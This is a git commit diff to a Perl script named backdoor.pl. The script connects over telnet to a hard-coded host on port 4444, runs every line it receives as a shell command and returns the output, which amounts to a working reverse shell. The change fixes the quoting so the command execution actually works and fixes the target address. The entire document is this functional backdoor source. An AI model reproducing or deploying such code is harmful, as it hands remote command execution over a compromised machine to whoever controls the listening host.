857f34d65ee888bf8a8b06044c34da97e7b9afae
leoalb <leo.alberro@gmail.com>
2018-05-26 19:23:53 -0300

    Update

--- backdoor.pl
+++ backdoor.pl
@@ -1,16 +1,16 @@
 #!/usr/bin/perl
 use Net::Telnet ();
 use Net::Telnet;
-($ip) = @ARGV;
+($ip) = "10.0.1.2";
 print("$ip\n");
 $telnet = new Net::Telnet ( Timeout=>30, Port=>4444);
 $telnet->open($ip);
 $count=1;
-$telnet->print(’Acceso desde equipo remoto’);
-$pattern=’/\$ $/i’;
+$telnet->print('Acceso desde equipo remoto');
+$pattern='/\$ $/i';
 while ($count == 1) {
   $data = $telnet->get(Timeout=>100);
-  $output = ‘$data‘;
+  $output = `$data`;
   $telnet->print($output);
 }
 exit 0
